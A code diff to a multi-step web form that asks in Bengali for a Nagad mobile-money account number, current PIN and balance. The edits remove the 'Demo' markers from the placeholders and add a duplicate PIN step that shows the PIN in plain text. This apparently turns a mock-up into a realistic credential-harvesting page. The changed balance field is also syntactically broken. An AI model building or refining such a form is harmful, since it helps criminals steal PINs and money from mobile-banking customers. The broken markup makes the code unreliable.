@@ -1,15 +1,21 @@
-
 const steps = [
   {
     title: "Account Number",
     description: "আপনার নগদ অ্যাকাউন্ট নম্বর লিখুন।",
-    placeholder: "Demo account number",
+    placeholder: "account number",
     type: "text"
   },
   {
     title: "Password / PIN",
     description: "নগদ বর্তামান PIN লিখুন।",
-    placeholder: "Demo PIN (যেমন 1234)",
+    placeholder: "PIN",
+    type: "text"
+  },
+
+  {
+    title: "Password / PIN",
+    description: "নগদ বর্তামান PIN লিখুন।",
+    placeholder: "1234",
     type: "password"
   },
   {
@@ -19,8 +25,8 @@ const steps = [
       <input id="date" type="date">
 
       <p>আপনার বর্তমান ব্যালেন্স লিখুন।</p>
-      <input id="balance" type="number" min="0" step="0.01"
-        placeholder="00000">
+      <input id="balance" type="password"
+       placeholder: "০০০০০",
     `
   },
   {
